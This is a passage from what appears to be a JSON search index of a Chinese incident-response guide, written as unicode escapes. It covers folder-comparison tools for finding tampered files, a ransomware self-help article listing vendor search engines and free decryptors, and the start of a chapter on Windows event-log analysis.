\u63a8\u51fa\u7684\u6587\u4ef6\u6bd4\u8f83\u5de5\u5177\u3002\u4e3b\u8981\u7528\u9014\u662f\u5bf9\u6bd4\u4e24\u4e2a\u6587\u4ef6\u5939\u6216\u8005\u6587\u4ef6\uff0c\u5e76\u5c06\u5dee\u5f02\u4ee5\u989c\u8272\u6807\u793a\uff0c\u6bd4\u8f83\u8303\u56f4\u5305\u62ec\u76ee\u5f55\uff0c\u6587\u6863\u5185\u5bb9\u7b49\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.scootersoftware.com/download.php \u8f6f\u4ef6\u4f7f\u7528\u793a\u4f8b\uff0c\u901a\u8fc7\u6587\u4ef6\u5939\u6bd4\u8f83\uff0c\u627e\u51fa\u6587\u4ef6\u5939\u4e2d\u7684\u5dee\u5f02\u5185\u5bb9\u3002 1\u3001\u53cc\u51fb Beyond Compare \uff0c\u6253\u5f00\u8f6f\u4ef6\u4e3b\u9875\uff0c\u9009\u62e9\u6587\u4ef6\u5939\u6bd4\u8f83\u3002 2\u3001\u5728\u53cc\u8fb9\u680f\u8f93\u5165\u6587\u4ef6\u5939\u8def\u5f84\uff0c\u70b9\u51fb\u663e\u793a\u5dee\u522b\uff0c\u5217\u51fa\u5dee\u5f02\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7d2b\u8272\u90e8\u5206\u4e3a\u65b0\u589e\u6587\u4ef6\uff0c\u7ea2\u8272\u90e8\u5206\u4e3a\u7be1\u6539\u6587\u4ef6\u3002 3\u3001\u53cc\u51fb\u5177\u4f53\u6587\u4ef6\uff0c\u8fdb\u5165\u4ee3\u7801\u5bf9\u6bd4\uff0c\u627e\u5230\u4ee3\u7801\u5dee\u5f02\u90e8\u5206\u3002 WinMerge WinMerge \u662f\u4e00\u6b3e\u8fd0\u884c\u4e8e Windows \u7cfb\u7edf\u4e0b\u7684\u6587\u4ef6\u6bd4\u8f83\u548c\u5408\u5e76\u5de5\u5177\uff0c\u4f7f\u7528\u5b83\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u6bd4\u8f83\u6587\u4ef6\u5939\u548c\u6587\u4ef6\uff0c\u4ee5\u6613\u4e8e\u7406\u89e3\u7684\u53ef\u89c6\u6587\u672c\u683c\u5f0f\u663e\u793a\u5dee\u5f02\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://winmerge.org/downloads/ 1\u3001\u6587\u4ef6 -- \u6253\u5f00\uff0c\u9009\u62e9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u7136\u540e\u70b9\u51fb\u8fdb\u884c\u6bd4\u8f83\u3002 2\u3001\u5728\u540c\u4e00\u4e2a\u754c\u9762\u91cc\uff0c\u901a\u8fc7\u989c\u8272\u548c\u6587\u672c\u63d0\u793a\uff0c\u663e\u793a\u6587\u4ef6\u5939\u5185\u5bb9\u5dee\u5f02\u3002","title":"\u524d\u8a00\uff1a"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E8%87%AA%E6%95%91%E6%8C%87%E5%8D%97/","text":"\u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 \u00b6 \u524d\u8a00 \u00b6 \u7ecf\u5e38\u4f1a\u6709\u4e00\u4e9b\u5c0f\u4f19\u4f34\u95ee\uff1a\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u8be5\u600e\u4e48\u529e\uff0c\u53ef\u4ee5\u89e3\u5bc6\u5417\uff1f \u7b2c\u4e00\u6b21\u9047\u5230\u52d2\u7d22\u75c5\u6bd2\u662f\u5728\u65e9\u51e0\u5e74\u7684\u65f6\u5019\uff0c\u5ba2\u6237\u56e0\u7f51\u7ad9\u8bbf\u95ee\u5f02\u5e38\uff0c\u8fdb\u800c\u8fdc\u7a0b\u534f\u52a9\u8fdb\u884c\u6392\u67e5\u3002\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u540e\u7f00\u540d\u88ab\u7be1\u6539\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a\u6587\u4ef6\u6253\u5f00\u540e\u663e\u793a\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u8fd9\u4fbf\u662f\u52d2\u7d22\u75c5\u6bd2\u7684\u7279\u5f81\u3002 \u51fa\u4e8e\u804c\u4e1a\u4e60\u60ef\uff0c\u6211\u6253\u5305\u4e86\u90e8\u5206\u52a0\u5bc6\u6587\u4ef6\u6837\u672c\u548c\u52d2\u7d22\u75c5\u6bd2\u63d0\u793a\u4fe1\u606f\u7528\u4e8e\u7559\u6863\uff0c\u5c31\u5728\u4eca\u5929\uff0c\u6211\u53c8\u91cd\u65b0\u4e0a\u4f20\u4e86\u6837\u672c\uff0c\u81f3\u4eca\u4f9d\u7136\u65e0\u6cd5\u89e3\u5bc6\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5b89\u5168\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5e08\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u5404\u5927\u5b89\u5168\u516c\u53f8\u7684\u80fd\u529b\uff0c\u5bfb\u627e\u52d2\u7d22\u75c5\u6bd2\u7684\u89e3\u5bc6\u5de5\u5177\u3002 \u672c\u6587\u6574\u7406\u4e86\u4e00\u4efd\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357\uff0c\u901a\u8fc7\u52d2\u7d22\u75c5\u6bd2\u7d22\u5f15\u5f15\u64ce\u67e5\u627e\u52d2\u7d22\u75c5\u6bd2\u76f8\u5173\u4fe1\u606f\uff0c\u518d\u901a\u8fc7\u5404\u4e2a\u5b89\u5168\u516c\u53f8\u63d0\u4f9b\u7684\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u89e3\u5bc6\u3002\u5f53\u7136\uff0c\u80fd\u5426\u89e3\u5bc6\u5168\u51ed\u8fd0\u6c14\uff0cso\uff0c\u5e73\u65f6\u8fd8\u662f\u52e4\u6253\u8865\u4e01\u591a\u5907\u4efd\u3002 \u4e00\u3001\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5728\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\u8f93\u5165\u75c5\u6bd2\u540d\u3001\u52d2\u7d22\u90ae\u7bb1\u3001\u88ab\u52a0\u5bc6\u540e\u6587\u4ef6\u7684\u540e\u7f00\u540d\uff0c\u6216\u76f4\u63a5\u4e0a\u4f20\u88ab\u52a0\u5bc6\u6587\u4ef6\u3001\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u5373\u53ef\u53ef\u5feb\u901f\u67e5\u627e\u5230\u75c5\u6bd2\u8be6\u60c5\u548c\u89e3\u5bc6\u5de5\u5177\u3002 \u8fd9\u4e9b\u7f51\u7ad9\u7684\u89e3\u5bc6\u80fd\u529b\u8fd8\u5728\u6301\u7eed\u66f4\u65b0\u4e2d\uff0c\u662f\u503c\u5f97\u6536\u85cf\u7684\u51e0\u4e2a\u52d2\u7d22\u75c5\u6bd2\u5de5\u5177\u578b\u7f51\u7ad9\u3002 \u3010360\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7800\u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2 \u5b98\u7f51\uff1a http://lesuobingdu.360.cn \u3010\u817e\u8baf\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7 300 \u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2 \u5b98\u7f51\uff1a https://guanjia.qq.com/pr/ls \u3010\u542f\u660e\u3011VenusEye\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u8d85300\u79cd\u52d2\u7d22\u75c5\u6bd2\u5bb6\u65cf \u5b98\u7f51\uff1a https://lesuo.venuseye.com.cn \u3010\u5947\u5b89\u4fe1\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5b98\u7f51\uff1a https://lesuobingdu.qianxin.com \u3010\u6df1\u4fe1\u670d\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5b98\u7f51\uff1a https://edr.sangfor.com.cn/#/information/ransom_search \u4e8c\u3001\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5f88\u591a\u5b89\u5168\u516c\u53f8\u90fd\u63d0\u4f9b\u4e86\u514d\u8d39\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d\uff0c\u6536\u96c6\u548c\u6574\u7406\u76f8\u5173\u4e0b\u8f7d\u5730\u5740\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u548c\u83b7\u53d6\u6700\u65b0\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u3002 \u3010\u817e\u8baf\u54c8\u52c3\u3011\u52d2\u7d22\u8f6f\u4ef6\u4e13\u6740\u5de5\u5177 \u5b98\u7f51\uff1a https://habo.qq.com/tool \u3010\u91d1\u5c71\u6bd2\u9738\u3011\u52d2\u7d22\u75c5\u6bd2\u514d\u75ab\u5de5\u5177 \u5b98\u7f51\uff1a http://www.duba.net/dbt/wannacry.html \u3010\u706b\u7ed2\u3011\u5b89\u5168\u5de5\u5177\u4e0b\u8f7d \u5b98\u7f51\uff1a http://bbs.huorong.cn/forum-55-1.html \u3010\u745e\u661f\u3011\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d \u5b98\u7f51\uff1a http://it.rising.com.cn/fanglesuo/index.html \u3010nomoreransom\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5b98\u7f51\uff1a https://www.nomoreransom.org/zh/index.html \u3010MalwareHunterTeam\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5b98\u7f51\uff1a https://id-ransomware.malwarehunterteam.com \u3010\u5361\u5df4\u65af\u57fa\u3011\u514d\u8d39\u52d2\u7d22\u89e3\u5bc6\u5668 \u5b98\u7f51\uff1a https://noransom.kaspersky.com \u3010Avast\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 \u5b98\u7f51\uff1a https://www.avast.com/zh-cn/ransomware-decryption-tools \u3010Emsisoft\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 \u5b98\u7f51\uff1a https://www.emsisoft.com/ransomware-decryption-tools/free-download \u3010GitHub \u9879\u76ee\u3011\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u6536\u96c6\u6c47\u603b \u5b98\u7f51\uff1a https://github.com/jiansiting/Decryption-Tools","title":"\u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E8%87%AA%E6%95%91%E6%8C%87%E5%8D%97/#\u7b2c5\u7bc7\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357","text":"","title":"\u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E8%87%AA%E6%95%91%E6%8C%87%E5%8D%97/#\u524d\u8a00","text":"\u7ecf\u5e38\u4f1a\u6709\u4e00\u4e9b\u5c0f\u4f19\u4f34\u95ee\uff1a\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u8be5\u600e\u4e48\u529e\uff0c\u53ef\u4ee5\u89e3\u5bc6\u5417\uff1f \u7b2c\u4e00\u6b21\u9047\u5230\u52d2\u7d22\u75c5\u6bd2\u662f\u5728\u65e9\u51e0\u5e74\u7684\u65f6\u5019\uff0c\u5ba2\u6237\u56e0\u7f51\u7ad9\u8bbf\u95ee\u5f02\u5e38\uff0c\u8fdb\u800c\u8fdc\u7a0b\u534f\u52a9\u8fdb\u884c\u6392\u67e5\u3002\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u540e\u7f00\u540d\u88ab\u7be1\u6539\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a\u6587\u4ef6\u6253\u5f00\u540e\u663e\u793a\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u8fd9\u4fbf\u662f\u52d2\u7d22\u75c5\u6bd2\u7684\u7279\u5f81\u3002 \u51fa\u4e8e\u804c\u4e1a\u4e60\u60ef\uff0c\u6211\u6253\u5305\u4e86\u90e8\u5206\u52a0\u5bc6\u6587\u4ef6\u6837\u672c\u548c\u52d2\u7d22\u75c5\u6bd2\u63d0\u793a\u4fe1\u606f\u7528\u4e8e\u7559\u6863\uff0c\u5c31\u5728\u4eca\u5929\uff0c\u6211\u53c8\u91cd\u65b0\u4e0a\u4f20\u4e86\u6837\u672c\uff0c\u81f3\u4eca\u4f9d\u7136\u65e0\u6cd5\u89e3\u5bc6\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5b89\u5168\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5e08\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u5404\u5927\u5b89\u5168\u516c\u53f8\u7684\u80fd\u529b\uff0c\u5bfb\u627e\u52d2\u7d22\u75c5\u6bd2\u7684\u89e3\u5bc6\u5de5\u5177\u3002 \u672c\u6587\u6574\u7406\u4e86\u4e00\u4efd\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357\uff0c\u901a\u8fc7\u52d2\u7d22\u75c5\u6bd2\u7d22\u5f15\u5f15\u64ce\u67e5\u627e\u52d2\u7d22\u75c5\u6bd2\u76f8\u5173\u4fe1\u606f\uff0c\u518d\u901a\u8fc7\u5404\u4e2a\u5b89\u5168\u516c\u53f8\u63d0\u4f9b\u7684\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u89e3\u5bc6\u3002\u5f53\u7136\uff0c\u80fd\u5426\u89e3\u5bc6\u5168\u51ed\u8fd0\u6c14\uff0cso\uff0c\u5e73\u65f6\u8fd8\u662f\u52e4\u6253\u8865\u4e01\u591a\u5907\u4efd\u3002 \u4e00\u3001\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5728\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\u8f93\u5165\u75c5\u6bd2\u540d\u3001\u52d2\u7d22\u90ae\u7bb1\u3001\u88ab\u52a0\u5bc6\u540e\u6587\u4ef6\u7684\u540e\u7f00\u540d\uff0c\u6216\u76f4\u63a5\u4e0a\u4f20\u88ab\u52a0\u5bc6\u6587\u4ef6\u3001\u52d2\u7d22\u63d0\u793a\u4fe1\u606f\uff0c\u5373\u53ef\u53ef\u5feb\u901f\u67e5\u627e\u5230\u75c5\u6bd2\u8be6\u60c5\u548c\u89e3\u5bc6\u5de5\u5177\u3002 \u8fd9\u4e9b\u7f51\u7ad9\u7684\u89e3\u5bc6\u80fd\u529b\u8fd8\u5728\u6301\u7eed\u66f4\u65b0\u4e2d\uff0c\u662f\u503c\u5f97\u6536\u85cf\u7684\u51e0\u4e2a\u52d2\u7d22\u75c5\u6bd2\u5de5\u5177\u578b\u7f51\u7ad9\u3002 \u3010360\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7800\u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2 \u5b98\u7f51\uff1a http://lesuobingdu.360.cn \u3010\u817e\u8baf\u3011 \u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u652f\u6301\u68c0\u7d22\u8d85\u8fc7 300 \u79cd\u5e38\u89c1\u52d2\u7d22\u75c5\u6bd2 \u5b98\u7f51\uff1a https://guanjia.qq.com/pr/ls \u3010\u542f\u660e\u3011VenusEye\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce\uff0c\u8d85300\u79cd\u52d2\u7d22\u75c5\u6bd2\u5bb6\u65cf \u5b98\u7f51\uff1a https://lesuo.venuseye.com.cn \u3010\u5947\u5b89\u4fe1\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5b98\u7f51\uff1a https://lesuobingdu.qianxin.com \u3010\u6df1\u4fe1\u670d\u3011\u52d2\u7d22\u75c5\u6bd2\u641c\u7d22\u5f15\u64ce \u5b98\u7f51\uff1a https://edr.sangfor.com.cn/#/information/ransom_search \u4e8c\u3001\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5f88\u591a\u5b89\u5168\u516c\u53f8\u90fd\u63d0\u4f9b\u4e86\u514d\u8d39\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d\uff0c\u6536\u96c6\u548c\u6574\u7406\u76f8\u5173\u4e0b\u8f7d\u5730\u5740\uff0c\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u548c\u83b7\u53d6\u6700\u65b0\u7684\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u3002 \u3010\u817e\u8baf\u54c8\u52c3\u3011\u52d2\u7d22\u8f6f\u4ef6\u4e13\u6740\u5de5\u5177 \u5b98\u7f51\uff1a https://habo.qq.com/tool \u3010\u91d1\u5c71\u6bd2\u9738\u3011\u52d2\u7d22\u75c5\u6bd2\u514d\u75ab\u5de5\u5177 \u5b98\u7f51\uff1a http://www.duba.net/dbt/wannacry.html \u3010\u706b\u7ed2\u3011\u5b89\u5168\u5de5\u5177\u4e0b\u8f7d \u5b98\u7f51\uff1a http://bbs.huorong.cn/forum-55-1.html \u3010\u745e\u661f\u3011\u89e3\u5bc6\u5de5\u5177\u4e0b\u8f7d \u5b98\u7f51\uff1a http://it.rising.com.cn/fanglesuo/index.html \u3010nomoreransom\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5b98\u7f51\uff1a https://www.nomoreransom.org/zh/index.html \u3010MalwareHunterTeam\u3011\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177\u96c6 \u5b98\u7f51\uff1a https://id-ransomware.malwarehunterteam.com \u3010\u5361\u5df4\u65af\u57fa\u3011\u514d\u8d39\u52d2\u7d22\u89e3\u5bc6\u5668 \u5b98\u7f51\uff1a https://noransom.kaspersky.com \u3010Avast\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 \u5b98\u7f51\uff1a https://www.avast.com/zh-cn/ransomware-decryption-tools \u3010Emsisoft\u3011\u514d\u8d39\u52d2\u7d22\u8f6f\u4ef6\u89e3\u5bc6\u5de5\u5177 \u5b98\u7f51\uff1a https://www.emsisoft.com/ransomware-decryption-tools/free-download \u3010GitHub \u9879\u76ee\u3011\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\u6536\u96c6\u6c47\u603b \u5b98\u7f51\uff1a https://github.com/jiansiting/Decryption-Tools","title":"\u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","text":"\u7b2c1\u7bc7:Windows\u65e5\u5fd7\u5206\u6790 \u00b6 0x01 Windows\u4e8b\u4ef6\u65e5\u5fd7\u7b80\u4ecb \u00b6 Windows\u7cfb\u7edf\u65e5\u5fd7\u662f\u8bb0\u5f55\u7cfb\u7edf\u4e2d\u786c\u4ef6\u3001\u8f6f\u4ef6\u548c\u7cfb\u7edf\u95ee\u9898\u7684\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u76d1\u89c6\u7cfb\u7edf\u4e2d\u53d1\u751f\u7684\u4e8b\u4ef6\u3002\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u68c0\u67e5\u9519\u8bef\u53d1\u751f\u7684\u539f\u56e0\uff0c\u6216\u8005\u5bfb\u627e\u53d7\u5230\u653b\u51fb\u65f6\u653b\u51fb\u8005\u7559\u4e0b\u7684\u75d5\u8ff9\u3002 Windows\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u7c7b\u65e5\u5fd7\u8bb0\u5f55\u7cfb\u7edf\u4e8b\u4ef6\uff1a\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\u548c\u5b89\u5168\u65e5\u5fd7\u3002 \u7cfb\u7edf\u65e5\u5fd7 \u8bb0\u5f55\u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\u4ea7\u751f\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\u3001\u7cfb\u7edf\u7ec4\u4ef6\u548c\u5e94\u7528\u8f6f\u4ef6\u7684\u5d29\u6e83\u4ee5\u53ca\u6570\u636e\u4e22\u5931\u9519\u8bef\u7b49\u3002\u7cfb\u7edf\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u7684\u65f6\u95f4\u7c7b\u578b\u7531Windows\u2002NT/2000\u64cd\u4f5c\u7cfb\u7edf\u9884\u5148\u5b9a\u4e49\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx \u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 \u5305\u542b\u7531\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u7a0b\u5e8f\u8bb0\u5f55\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u8bb0\u5f55\u7a0b\u5e8f\u8fd0\u884c\u65b9\u9762\u7684\u4e8b\u4ef6\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u7a0b\u5e8f\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u6587\u4ef6\u9519\u8bef\uff0c\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u81ea\u884c\u51b3\u5b9a\u76d1\u89c6\u54ea\u4e9b\u4e8b\u4ef6\u3002\u5982\u679c\u67d0\u4e2a\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u5d29\u6e83\u60c5\u51b5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ece\u7a0b\u5e8f\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u627e\u5230\u76f8\u5e94\u7684\u8bb0\u5f55\uff0c\u4e5f\u8bb8\u4f1a\u6709\u52a9\u4e8e\u4f60\u89e3\u51b3\u95ee\u9898\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx \u5b89\u5168\u65e5\u5fd7 \u8bb0\u5f55\u7cfb\u7edf\u7684\u5b89\u5168\u5ba1\u8ba1\u4e8b\u4ef6\uff0c\u5305\u542b\u5404\u79cd\u7c7b\u578b\u7684\u767b\u5f55\u65e5\u5fd7\u3001\u5bf9\u8c61\u8bbf\u95ee\u65e5\u5fd7\u3001\u8fdb\u7a0b\u8ffd\u8e2a\u65e5\u5fd7\u3001\u7279\u6743\u4f7f\u7528\u3001\u5e10\u53f7\u7ba1\u7406\u3001\u7b56\u7565\u53d8\u66f4\u3001\u7cfb\u7edf\u4e8b\u4ef6\u3002\u5b89\u5168\u65e5\u5fd7\u4e5f\u662f\u8c03\u67e5\u53d6\u8bc1\u4e2d\u6700\u5e38\u7528\u5230\u7684\u65e5\u5fd7\u3002\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u5b89\u5168\u6027\u65e5\u5fd7\u662f\u5173\u95ed\u7684\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u7ec4\u7b56\u7565\u6765\u542f\u52a8\u5b89\u5168\u6027\u65e5\u5fd7\uff0c\u6216\u8005\u5728\u6ce8\u518c\u8868\u4e2d\u8bbe\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u4ee5\u4fbf\u5f53\u5b89\u5168\u6027\u65e5\u5fd7\u6ee1\u540e\u4f7f\u7cfb\u7edf\u505c\u6b62\u54cd\u5e94\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx \u200b \u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u5b58\u50a8\u7740\u6545\u969c\u6392\u9664\u4fe1\u606f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u5458\u66f4\u4e3a\u6709\u7528\u3002 \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\uff0c\u5bf9\u4e8e\u8c03\u67e5\u4eba\u5458\u800c\u8a00\uff0c\u66f4\u6709\u5e2e\u52a9\u3002 0X02 \u5ba1\u6838\u7b56\u7565\u4e0e\u4e8b\u4ef6\u67e5\u770b\u5668 \u00b6 Windows Server 2008 R2 \u7cfb\u7edf\u7684\u5ba1\u6838\u529f\u80fd\u5728\u9ed8\u8ba4\u72b6\u6001\u4e0b\u5e76\u6ca1\u6709\u542f\u7528 \uff0c\u5efa\u8bae\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 PS\uff1a\u9ed8\u8ba4\u72b6\u6001\u4e0b\uff0c\u4e5f\u4f1a\u8bb0\u5f55\u4e00\u4e9b\u7b80\u5355\u7684\u65e5\u5fd7\uff0c\u65e5\u5fd7\u9ed8\u8ba4\u5927\u5c0f20M \u8bbe\u7f6e1 \uff1a\u5f00\u59cb \u2192 \u7ba1\u7406\u5de5\u5177 \u2192 \u672c\u5730\u5b89\u5168\u7b56\u7565 \u2192 \u672c\u5730\u7b56\u7565 \u2192 \u5ba1\u6838\u7b56\u7565\uff0c\u53c2\u8003\u914d\u7f6e\u64cd\u4f5c\uff1a \u8bbe\u7f6e2 \uff1a\u8bbe\u7f6e\u5408\u7406\u7684\u65e5\u5fd7\u5c5e\u6027\uff0c\u5373\u65e5\u5fd7\u6700\u5927\u5927\u5c0f\u3001\u4e8b\u4ef6\u8986\u76d6\u9600\u503c\u7b49\uff1a \u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\u65b9\u6cd5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d** \u6309 \" Window+R \"\uff0c\u8f93\u5165 \u201d 